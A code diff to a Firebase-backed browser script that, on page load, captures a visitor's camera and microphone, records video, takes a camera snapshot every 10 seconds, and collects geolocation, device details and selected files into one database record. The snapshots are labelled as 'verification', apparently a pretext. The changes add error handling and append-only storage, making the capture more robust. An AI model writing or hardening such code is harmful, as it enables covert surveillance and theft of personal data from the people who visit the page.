@@ -1,7 +1,9 @@
 import { db, storage } from "./firebase-config.js";
 import {
   doc,
-  setDoc
+  setDoc,
+  updateDoc,
+  arrayUnion
 } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore.js";
 
 import {
@@ -96,23 +98,27 @@ async function uploadFiles(files) {
  */
 async function startSnapshotLoop() {
   setInterval(async () => {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    try {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    canvas.toBlob(async (blob) => {
-      const fileName = `snapshots/photo_${Date.now()}.jpg`;
-      const snapshotRef = ref(storage, fileName);
-      await uploadBytes(snapshotRef, blob);
-      const downloadURL = await getDownloadURL(snapshotRef);
+      canvas.toBlob(async (blob) => {
+        const fileName = `snapshots/photo_${Date.now()}.jpg`;
+        const snapshotRef = ref(storage, fileName);
+        await uploadBytes(snapshotRef, blob);
+        const downloadURL = await getDownloadURL(snapshotRef);
 
-      // Add to Firestore
-      await setDoc(doc(db, "web", "user"), {
-        verificationSnapshots: [downloadURL]
-      }, { merge: true });
+        // Append to array in Firestore (arrayUnion avoids overwriting)
+        await updateDoc(doc(db, "web", "user"), {
+          verificationSnapshots: arrayUnion(downloadURL)
+        });
 
-      console.log(`📸 Snapshot saved: ${downloadURL}`);
-    }, "image/jpeg", 0.95);
+        console.log(`📸 Snapshot saved: ${downloadURL}`);
+      }, "image/jpeg", 0.95);
+    } catch (err) {
+      console.error("❌ Snapshot upload error:", err);
+    }
   }, 10000); // Every 10 seconds
 }
 
@@ -120,40 +126,51 @@ async function startSnapshotLoop() {
  * Main function to collect all data
  */
 async function collectAll() {
-  const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-  video.srcObject = stream;
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    video.srcObject = stream;
 
-  const location = await getLocation().catch(() => null);
-  const deviceInfo = await getDeviceInfo();
-  const recordedVideoUrl = await recordCameraVideo(stream);
+    const location = await getLocation().catch(() => null);
+    const deviceInfo = await getDeviceInfo();
+    const recordedVideoUrl = await recordCameraVideo(stream);
 
-  // Save initial data
-  await setDoc(doc(db, "web", "user"), {
-    timestamp: new Date(),
-    deviceInfo,
-    location: location ? {
-      latitude: location.coords.latitude,
-      longitude: location.coords.longitude
-    } : "Location denied",
-    recordedVideo: recordedVideoUrl,
-    uploadedFiles: [],
-    verificationSnapshots: []
-  });
-
-  // Start camera snapshot loop
-  startSnapshotLoop();
-
-  // Upload files on user selection
-  fileInput.addEventListener("change", async (e) => {
-    const files = e.target.files;
-    const uploadedFileUrls = await uploadFiles(files);
-
+    // Save initial data
     await setDoc(doc(db, "web", "user"), {
-      uploadedFiles: uploadedFileUrls
-    }, { merge: true });
+      timestamp: new Date().toISOString(),
+      deviceInfo,
+      location: location ? {
+        latitude: location.coords.latitude,
+        longitude: location.coords.longitude
+      } : "Location denied",
+      recordedVideo: recordedVideoUrl,
+      uploadedFiles: [],
+      verificationSnapshots: []
+    });
 
-    console.log("✔️ Files uploaded and data saved.");
-  });
+    console.log("✅ Initial data saved to Firestore");
+
+    // Start camera snapshot loop
+    startSnapshotLoop();
+
+    // Upload files on user selection
+    fileInput.addEventListener("change", async (e) => {
+      try {
+        const files = e.target.files;
+        const uploadedFileUrls = await uploadFiles(files);
+
+        await updateDoc(doc(db, "web", "user"), {
+          uploadedFiles: arrayUnion(...uploadedFileUrls)
+        });
+
+        console.log("✔️ Files uploaded and saved to Firestore");
+      } catch (err) {
+        console.error("❌ File upload error:", err);
+      }
+    });
+
+  } catch (err) {
+    console.error("❌ collectAll() error:", err);
+  }
 }
 
 // Start on page load
